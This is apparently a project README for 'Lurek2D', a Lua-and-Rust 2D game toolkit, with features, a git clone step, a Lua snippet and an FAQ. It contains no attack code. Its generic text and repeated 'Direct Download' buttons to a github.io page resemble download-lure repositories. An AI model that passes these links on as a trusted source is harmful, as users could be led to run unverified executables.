# Lurek2D v2026 - 2D Game Runtime and Toolkit 2026

> **Lurek2D is a desktop-oriented 2D runtime and toolkit that pairs Lua-centric scripting with a Rust core so you can create games, simulations, visual utilities, and interactive applications in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylan-jamesdc9165/lurek2d-lua-rust-toolkit?style=flat-square)](https://github.com/dylan-jamesdc9165/lurek2d-lua-rust-toolkit)

---

<p align="center">
  <a href="https://dylan-jamesdc9165.github.io/lurek2d-lua-rust-toolkit/">
    <img src="https://img.shields.io/badge/Download-Lurek2D%20Latest-brightgreen?style=for-the-badge" alt="Download Lurek2D">
  </a>
</p>

> **[Direct Download - Lurek2D v2026](https://dylan-jamesdc9165.github.io/lurek2d-lua-rust-toolkit/)**

---

[Download Latest Build](https://dylan-jamesdc9165.github.io/lurek2d-lua-rust-toolkit/)

---

## Overview

Lurek2D is aimed at developers who prefer a code-driven 2D workflow but still want direct access to low-level engine behavior. Lua is used for gameplay and application logic, while a Rust-based core handles rendering, audio, input, physics, and filesystem operations.

The toolkit targets desktop projects that benefit from a compact runtime and a well-defined public API. Through the `lurek.*` interface, generated API docs, and LuaCATS stubs, it gives scripting-heavy work a clearer path from early prototyping to shipped builds.

---

## What It Offers

- Lua-first scripting for gameplay, application behavior, and interactive logic
- Rust-backed core systems for rendering, audio, input, physics, and filesystem work
- Public `lurek.*` API for code-first development
- Generated API documentation for easier reference and integration
- LuaCATS stubs to support editor assistance and typed workflows
- Built for 2D games and desktop interactive experiences
- Suitable for simulations and visual tools alongside standard games
- AI-assisted development direction for modern scripting-driven workflows

---

## Installation

Clone the repository and open it in your preferred development environment:

```bash
git clone https://github.com/dylan-jamesdc9165/lurek2d-lua-rust-toolkit.git
cd lurek_2d
```

From there, follow the project startup path for your platform and toolchain. If you are working from a packaged build, download the latest release and launch the included desktop runtime or demo entry point.

---

## Using Lurek2D

Lurek2D is built around a script-led workflow: Lua defines behavior, and the engine core supplies the underlying systems.

Typical flow:

1. Create or open a project inside the repository structure.
2. Write game or app logic in Lua.
3. Use `lurek.*` modules for engine features such as input, audio, rendering, and physics.
4. Consult the generated docs or LuaCATS stubs while building features.
5. Run the desktop target and iterate on content, interaction, and presentation.

Example pattern:

```lua
local input = lurek.input
local audio = lurek.audio
local gfx = lurek.render

-- project logic goes here
```

Use the runtime as the execution layer for 2D gameplay, simulations, UI-heavy tools, or other interactive desktop applications.

---

## Project Configuration

Project settings are usually kept in the repository's runtime and project files. If your build includes configuration assets, store engine options, paths, and launch settings with the project so they remain versioned with the code.

A simple project-style layout may look like this:

```text
lurek_2d/
  scripts/
  assets/
  config/
  docs/
```

Adjust the configuration location to match your project structure and deployment target.

---

## Requirements

- Desktop platform
- A working Rust toolchain for core development and builds
- Lua scripting support for gameplay and app logic
- Sufficient storage for source, assets, and generated documentation
- A desktop environment suitable for running the runtime and toolchain

---

## FAQ

**What sort of projects does Lurek2D target?**  
It is intended for 2D games, simulations, visual tools, and interactive desktop applications.

**Is the workflow centered on Lua or Rust?**  
The logic layer is Lua-first, while Rust provides the engine core and system access.

**Where can I find API information?**  
Use the generated API documentation and the LuaCATS stubs included with the project.

**How do I get the latest version?**  
Pull the newest repository changes or download the latest build from the link above.

**What should I check if the runtime does not start properly?**  
Review your project configuration, confirm the required toolchain and runtime files are available, and refer to the documentation generated for the current version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
